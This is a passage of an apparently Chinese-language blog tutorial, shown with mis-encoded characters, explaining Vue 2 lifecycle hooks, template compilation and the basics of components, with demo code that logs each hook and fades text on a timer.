class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ç®€ä»‹ç”Ÿå‘½å‘¨æœŸ"><a href="#ç®€ä»‹ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="ç®€ä»‹ç”Ÿå‘½å‘¨æœŸ"></a>ç®€ä»‹ç”Ÿå‘½å‘¨æœŸ</h3><p>Vue å®ä¾‹æœ‰â¼€ä¸ªå®Œæ•´çš„â½£å‘½å‘¨æœŸï¼Œä¹Ÿå°±æ˜¯ä»new Vue()ã€åˆå§‹åŒ–äº‹ä»¶(.onceäº‹ä»¶)å’Œç”Ÿå‘½å‘¨æœŸã€ç¼–è¯‘æ¨¡ç‰ˆã€æŒ‚è½½Dom -&gt; æ¸²æŸ“ã€æ›´æ–° -&gt;<br>æ¸²æŸ“ã€å¸è½½ ç­‰â¼€ç³»åˆ—è¿‡ç¨‹ï¼Œç§°è¿™æ˜¯Vueçš„â½£å‘½å‘¨æœŸã€‚</p><p>å…ˆæ¥ä¸€å¼ å°šç¡…è°·çš„å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124120234807.png" alt="image-20221124120234807"></p><ol><li><p><strong>beforeCreate ï¼ˆåˆ›å»ºå‰ï¼‰</strong>ï¼šæ•°æ®ç›‘æµ‹(getterå’Œsetter)å’Œåˆå§‹åŒ–äº‹ä»¶è¿˜æœªå¼€å§‹ï¼Œæ­¤æ—¶ data çš„å“åº”å¼è¿½è¸ªã€event&#x2F;watcher éƒ½è¿˜æ²¡æœ‰è¢«è®¾ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½è®¿é—®åˆ°dataã€computedã€watchã€methodsä¸Šçš„æ–¹æ³•å’Œæ•°æ®ã€‚</p></li><li><p><strong>created ï¼ˆåˆ›å»ºåï¼‰</strong>ï¼šå®ä¾‹åˆ›å»ºå®Œæˆï¼Œå®ä¾‹ä¸Šé…ç½®çš„ options åŒ…æ‹¬ dataã€computedã€watchã€methods ç­‰éƒ½é…ç½®å®Œæˆï¼Œä½†æ˜¯æ­¤æ—¶æ¸²æŸ“å¾—èŠ‚ç‚¹è¿˜æœªæŒ‚è½½åˆ° DOMï¼Œæ‰€ä»¥ä¸èƒ½è®¿é—®åˆ° <code>$el</code>å±æ€§ã€‚</p></li><li><p><strong>beforeMount ï¼ˆæŒ‚è½½å‰ï¼‰</strong>ï¼šåœ¨æŒ‚è½½å¼€å§‹ä¹‹å‰è¢«è°ƒç”¨ï¼Œç›¸å…³çš„renderå‡½æ•°é¦–æ¬¡è¢«è°ƒç”¨ã€‚æ­¤é˜¶æ®µVueå¼€å§‹è§£ææ¨¡æ¿ï¼Œç”Ÿæˆè™šæ‹ŸDOMå­˜åœ¨å†…å­˜ä¸­ï¼Œè¿˜æ²¡æœ‰æŠŠè™šæ‹ŸDOMè½¬æ¢æˆçœŸå®DOMï¼Œæ’å…¥é¡µé¢ä¸­ã€‚æ‰€ä»¥ç½‘é¡µä¸èƒ½æ˜¾ç¤ºè§£æå¥½çš„å†…å®¹ã€‚</p></li><li><p><strong>mounted ï¼ˆæŒ‚è½½åï¼‰</strong>ï¼šåœ¨elè¢«æ–°åˆ›å»ºçš„ vm.$elï¼ˆå°±æ˜¯çœŸå®DOMçš„æ‹·è´ï¼‰æ›¿æ¢ï¼Œå¹¶æŒ‚è½½åˆ°å®ä¾‹ä¸Šå»ä¹‹åè°ƒç”¨ï¼ˆå°†å†…å­˜ä¸­çš„è™šæ‹ŸDOMè½¬ä¸ºçœŸå®DOMï¼ŒçœŸå®DOMæ’å…¥é¡µé¢ï¼‰ã€‚æ­¤æ—¶é¡µé¢ä¸­å‘ˆç°çš„æ˜¯ç»è¿‡Vueç¼–è¯‘çš„DOMï¼Œè¿™æ—¶åœ¨è¿™ä¸ªé’©å­å‡½æ•°ä¸­å¯¹DOMçš„æ“ä½œå¯ä»¥æœ‰æ•ˆï¼Œä½†è¦å°½é‡é¿å…ã€‚ä¸€èˆ¬åœ¨è¿™ä¸ªé˜¶æ®µè¿›è¡Œï¼šå¼€å¯å®šæ—¶å™¨ï¼Œå‘é€ç½‘ç»œè¯·æ±‚ï¼Œè®¢é˜…æ¶ˆæ¯ï¼Œç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ç­‰ç­‰</p></li><li><p><strong>beforeUpdate ï¼ˆæ›´æ–°å‰ï¼‰</strong>ï¼šå“åº”å¼æ•°æ®æ›´æ–°æ—¶è°ƒç”¨ï¼Œæ­¤æ—¶è™½ç„¶å“åº”å¼æ•°æ®æ›´æ–°äº†ï¼Œä½†æ˜¯å¯¹åº”çš„çœŸå® DOM è¿˜æ²¡æœ‰è¢«æ¸²æŸ“ï¼ˆæ•°æ®æ˜¯æ–°çš„ï¼Œä½†é¡µé¢æ˜¯æ—§çš„ï¼Œé¡µé¢å’Œæ•°æ®æ²¡ä¿æŒåŒæ­¥å‘¢ï¼‰ã€‚</p></li><li><p><strong>updated ï¼ˆæ›´æ–°åï¼‰</strong> ï¼šåœ¨ç”±äºæ•°æ®æ›´æ”¹å¯¼è‡´çš„è™šæ‹ŸDOMé‡æ–°æ¸²æŸ“å’Œæ‰“è¡¥ä¸ä¹‹åè°ƒç”¨ã€‚æ­¤æ—¶ DOM å·²ç»æ ¹æ®å“åº”å¼æ•°æ®çš„å˜åŒ–æ›´æ–°äº†ã€‚è°ƒç”¨æ—¶ï¼Œç»„ä»¶ DOMå·²ç»æ›´æ–°ï¼Œæ‰€ä»¥å¯ä»¥æ‰§è¡Œä¾èµ–äºDOMçš„æ“ä½œã€‚ç„¶è€Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåº”è¯¥é¿å…åœ¨æ­¤æœŸé—´æ›´æ”¹çŠ¶æ€ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šå¯¼è‡´æ›´æ–°æ— é™å¾ªç¯ã€‚è¯¥é’©å­åœ¨æœåŠ¡å™¨ç«¯æ¸²æŸ“æœŸé—´ä¸è¢«è°ƒç”¨ã€‚</p></li><li><p><strong>beforeDestroy ï¼ˆé”€æ¯å‰ï¼‰</strong>ï¼šå®ä¾‹é”€æ¯ä¹‹å‰è°ƒç”¨ã€‚è¿™ä¸€æ­¥ï¼Œå®ä¾‹ä»ç„¶å®Œå…¨å¯ç”¨ï¼Œ<code>this</code> ä»èƒ½è·å–åˆ°å®ä¾‹ã€‚åœ¨è¿™ä¸ªé˜¶æ®µä¸€èˆ¬è¿›è¡Œå…³é—­å®šæ—¶å™¨ï¼Œå–æ¶ˆè®¢é˜…æ¶ˆæ¯ï¼Œè§£ç»‘è‡ªå®šä¹‰äº‹ä»¶ã€‚</p></li><li><p><strong>destroyed ï¼ˆé”€æ¯åï¼‰</strong>ï¼šå®ä¾‹é”€æ¯åè°ƒç”¨ï¼Œè°ƒç”¨åï¼ŒVue å®ä¾‹æŒ‡ç¤ºçš„æ‰€æœ‰ä¸œè¥¿éƒ½ä¼šè§£ç»‘å®šï¼Œæ‰€æœ‰çš„äº‹ä»¶ç›‘å¬å™¨ä¼šè¢«ç§»é™¤ï¼Œæ‰€æœ‰çš„å­å®ä¾‹ä¹Ÿä¼šè¢«é”€æ¯ã€‚è¯¥é’©å­åœ¨æœåŠ¡ç«¯æ¸²æŸ“æœŸé—´ä¸è¢«è°ƒç”¨ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>åˆ†æç”Ÿå‘½å‘¨æœŸ<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span> <span class="hljs-attr">:x</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å½“å‰çš„nå€¼æ˜¯ï¼š&#123;&#123; n &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>ç‚¹æˆ‘n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;bye&quot;</span>&gt;</span>ç‚¹æˆ‘é”€æ¯vm<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"><span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-comment">// template:`</span></span><br><span class="language-javascript"><span class="hljs-comment">// &lt;div&gt;</span></span><br><span class="language-javascript"><span class="hljs-comment">// &lt;h2&gt;å½“å‰çš„nå€¼æ˜¯ï¼š&#123;&#123;n&#125;&#125;&lt;/h2&gt;</span></span><br><span class="language-javascript"><span class="hljs-comment">// &lt;button @click=&quot;add&quot;&gt;ç‚¹æˆ‘n+1&lt;/button&gt;</span></span><br><span class="language-javascript"><span class="hljs-comment">// &lt;/div&gt;</span></span><br><span class="language-javascript"><span class="hljs-comment">// `,</span></span><br><span class="language-javascript"><span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-attr">n</span>: <span class="hljs-number">1</span></span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">add</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;add&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">n</span>++</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">bye</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;bye&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.$destroy()</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">watch</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">n</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;nå˜äº†&#x27;</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeCreate&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">created</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;created&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeMount</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeMount&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mounted&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeUpdate&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">updated</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;updated&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeDestroy&#x27;</span>)&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">destroyed</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;destroyed&#x27;</span>)&#125;,</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><blockquote><p>æ¥è®²ä¸€ä¸‹å›¾ä¸­é—´å¤§æ¡†æ¡†çš„å†…å®¹</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124120324744.png" alt="image-20221124120324744"></p><p>å…ˆåˆ¤æ–­æœ‰æ²¡æœ‰ <strong>el</strong> è¿™ä¸ªé…ç½®é¡¹ï¼Œæ²¡æœ‰å°±è°ƒç”¨ vm.$mount(el)ï¼Œå¦‚æœä¸¤ä¸ªéƒ½æ²¡æœ‰å°±ä¸€ç›´å¡ç€ï¼Œæ˜¾ç¤ºçš„ç•Œé¢å°±æ˜¯æœ€åŸå§‹çš„å®¹å™¨çš„ç•Œé¢ã€‚æœ‰ <strong>el</strong>è¿™ä¸ªé…ç½®é¡¹ï¼Œå°±è¿›è¡Œåˆ¤æ–­æœ‰æ²¡æœ‰ template è¿™ä¸ªé…ç½®é¡¹ï¼Œæ²¡æœ‰ template å°±å°† el ç»‘å®šçš„å®¹å™¨ç¼–è¯‘ä¸º vue æ¨¡æ¿ï¼Œæ¥ä¸ªå¯¹æ¯”å›¾ã€‚</p><p>æ²¡ç¼–è¯‘å‰çš„ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124120402534.png" alt="image-20221124120402534"></p><p>ç¼–è¯‘åï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124120418648.png" alt="image-20221124120418648"></p><p>è¿™ä¸ª template æœ‰å•¥ç”¨å’§ï¼Ÿ</p><p><strong>ç¬¬ä¸€ç§æƒ…å†µ ï¼Œæœ‰ templateï¼š</strong></p><p>å¦‚æœ el ç»‘å®šçš„å®¹å™¨æ²¡æœ‰ä»»ä½•å†…å®¹ï¼Œå°±ä¸€ä¸ªç©ºå£³å­ï¼Œä½†åœ¨ Vue å®ä¾‹ä¸­å†™äº† templateï¼Œå°±ä¼šç¼–è¯‘è§£æè¿™ä¸ª template é‡Œçš„å†…å®¹ï¼Œç”Ÿæˆè™šæ‹ŸDOMï¼Œæœ€åå°† è™šæ‹Ÿ DOM è½¬ä¸º çœŸå® DOM æ’å…¥é¡µé¢ï¼ˆå…¶å®å°±å¯ä»¥ç†è§£ä¸º template æ›¿ä»£äº† el ç»‘å®šçš„å®¹å™¨çš„å†…å®¹ï¼‰ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221113222324448.png" alt="image-20221113222324448"></p><p>å‘ç°&#x3D;&#x3D;idä¸ºroot&#x3D;&#x3D;çš„divå…ƒç´ æ•´ä¸ªè¢«æ›¿æ¢</p><p><strong>ç¬¬äºŒç§æƒ…å†µ ï¼Œæ²¡æœ‰ templateï¼š</strong></p><p>æ²¡æœ‰ templateï¼Œå°±ç¼–è¯‘è§£æ el ç»‘å®šçš„å®¹å™¨ï¼Œç”Ÿæˆè™šæ‹Ÿ DOMï¼Œåé¢å°±é¡ºç€ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œä¸‹å»ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å¸¸ç”¨çš„ç”Ÿå‘½å‘¨æœŸé’©å­</p><ul><li><p>amountedå‘é€ajaxè¯·æ±‚ã€å¯åŠ¨å®šæ—¶å™¨ã€ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ã€è®¢é˜…æ¶ˆæ¯ç­‰åˆå§‹åŒ–æ“ä½œ </p></li><li><p>bbeforeDestroyæ¸…é™¤å®šæ—¶å™¨ã€è§£ç»‘è‡ªå®šä¹‰äº‹ä»¶ã€å–æ¶ˆè®¢é˜…æ¶ˆæ¯ç­‰æ”¶å°¾å·¥ä½œ</p></li></ul><p>å…³äºé”€æ¯Vueå®ä¾‹</p><ul><li><p>é”€æ¯åå€ŸåŠ©Vueå¼€å‘è€…å·¥å…·çœ‹ä¸åˆ°ä»»ä½•ä¿¡æ¯</p></li><li><p>é”€æ¯åè‡ªå®šä¹‰äº‹ä»¶ä¼šå¤±æ•ˆï¼Œä½†åŸç”ŸDOMäº‹ä»¶ä¾ç„¶æœ‰æ•ˆ</p></li><li><p>ä¸€èˆ¬ä¸ä¼šåœ¨beforeDestroyæ“ä½œæ•°æ®ï¼Œå› ä¸ºå³ä¾¿æ“ä½œæ•°æ®ï¼Œä¹Ÿä¸ä¼šå†è§¦å‘æ›´æ–°æµç¨‹äº†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>å¼•å‡ºç”Ÿå‘½å‘¨æœŸ<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>æ¬¢è¿å­¦ä¹ Vue<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;opacity = 1&quot;</span>&gt;</span>é€æ˜åº¦è®¾ç½®ä¸º1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;stop&quot;</span>&gt;</span>ç‚¹æˆ‘åœæ­¢å˜æ¢<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">opacity</span>: <span class="hljs-number">1</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">stop</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.$destroy()</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-comment">// Vueå®Œæˆæ¨¡æ¿çš„è§£æå¹¶æŠŠåˆå§‹çš„çœŸå®DOMå…ƒç´ æ”¾å…¥é¡µé¢åï¼ˆæŒ‚è½½å®Œæ¯•ï¼‰è°ƒç”¨mounted</span></span><br><span class="language-javascript">    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mounted&#x27;</span>, <span class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">      <span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;setInterval&#x27;</span>)</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> -= <span class="hljs-number">0.01</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> = <span class="hljs-number">1</span></span><br><span class="language-javascript">      &#125;, <span class="hljs-number">16</span>)</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span>)</span><br><span class="language-javascript">      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmå³å°†é©¾é¹¤è¥¿æ¸¸äº†&#x27;</span>)</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-20ç»„ä»¶åŒ–ç¼–ç¨‹"><a href="#1-20ç»„ä»¶åŒ–ç¼–ç¨‹" class="headerlink" title="1.20ç»„ä»¶åŒ–ç¼–ç¨‹"></a>1.20ç»„ä»¶åŒ–ç¼–ç¨‹</h2><h3 id="æ¨¡å—ä¸ç»„ä»¶ã€æ¨¡å—åŒ–ä¸ç»„ä»¶åŒ–"><a href="#æ¨¡å—ä¸ç»„ä»¶ã€æ¨¡å—åŒ–ä¸ç»„ä»¶åŒ–" class="headerlink" title="æ¨¡å—ä¸ç»„ä»¶ã€æ¨¡å—åŒ–ä¸ç»„ä»¶åŒ–"></a>æ¨¡å—ä¸ç»„ä»¶ã€æ¨¡å—åŒ–ä¸ç»„ä»¶åŒ–</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image(2).png" alt="image(2)"></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image(3).png" alt="image(3)"></p><ol><li><p>æ¨¡å—</p><ul><li><p>ç†è§£ï¼šå‘å¤–æä¾›ç‰¹å®šåŠŸèƒ½çš„ js ç¨‹åºï¼Œä¸€èˆ¬å°±æ˜¯ä¸€ä¸ª js æ–‡ä»¶</p></li><li><p>ä¸ºä»€ä¹ˆï¼šjs æ–‡ä»¶å¾ˆå¤šå¾ˆå¤æ‚</p></li><li><p>ä½œç”¨ï¼šå¤ç”¨ã€ç®€åŒ– js çš„ç¼–å†™ï¼Œæé«˜ js è¿è¡Œæ•ˆç‡</p></li></ul></li><li><p>ç»„ä»¶</p><ul><li><p>å®šä¹‰ï¼šç”¨æ¥å®ç°å±€éƒ¨åŠŸèƒ½çš„ä»£ç å’Œèµ„æºçš„é›†åˆï¼ˆhtml&#x2F;css&#x2F;js&#x2F;imageâ€¦ï¼‰ </p></li><li><p>ä¸ºä»€ä¹ˆï¼šä¸€ä¸ªç•Œé¢çš„åŠŸèƒ½å¾ˆå¤æ‚ </p></li><li><p>ä½œç”¨ï¼šå¤ç”¨ç¼–ç ï¼Œç®€åŒ–é¡¹ç›®ç¼–ç ï¼Œæé«˜è¿è¡Œæ•ˆç‡</p></li></ul></li><li><p>æ¨¡å—åŒ–</p><ul><li>å½“åº”ç”¨ä¸­çš„ js éƒ½ä»¥æ¨¡å—æ¥ç¼–å†™çš„ï¼Œé‚£è¿™ä¸ªåº”ç”¨å°±æ˜¯ä¸€ä¸ªæ¨¡å—åŒ–çš„åº”ç”¨</li></ul></li><li><p>ç»„ä»¶åŒ–</p><ul><li>å½“åº”ç”¨ä¸­çš„åŠŸèƒ½éƒ½æ˜¯å¤šç»„ä»¶çš„æ–¹å¼æ¥ç¼–å†™çš„ï¼Œé‚£è¿™ä¸ªåº”ç”¨å°±æ˜¯ä¸€ä¸ªç»„ä»¶åŒ–çš„åº”ç”¨</li></ul></li></ol><h3 id="éå•æ–‡ä»¶ç»„ä»¶"><a href="#éå•æ–‡ä»¶ç»„ä»¶" class="headerlink" title="éå•æ–‡ä»¶ç»„ä»¶"></a>éå•æ–‡ä»¶ç»„ä»¶</h3><p>ä¸€ä¸ªæ–‡ä»¶ä¸­åªåŒ…å«æœ‰ 1 ä¸ªç»„ä»¶</p><h4 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h4><p>Vueä¸­ä½¿ç”¨ç»„ä»¶çš„ä¸‰å¤§æ­¥éª¤ï¼š</p><ul><li>å®šä¹‰ç»„ä»¶(åˆ›å»ºç»„ä»¶)</li><li>æ³¨å†Œç»„ä»¶</li><li>ä½¿ç”¨ç»„ä»¶(å†™ç»„ä»¶æ ‡ç­¾)</li></ul><p><strong>å®šä¹‰ç»„ä»¶</strong></p><p>ä½¿ç”¨Vue.extend(options)åˆ›å»ºï¼Œå…¶ä¸­optionså’Œnew Vue(options)æ—¶ä¼ å…¥çš„é‚£ä¸ªoptionså‡ ä¹ä¸€æ ·ï¼Œä½†ä¹Ÿæœ‰ç‚¹åŒºåˆ«ï¼›</p><p>åŒºåˆ«å¦‚ä¸‹ï¼š</p><ul><li>elä¸è¦å†™ï¼Œä¸ºä»€ä¹ˆï¼Ÿ â€”â€”â€” 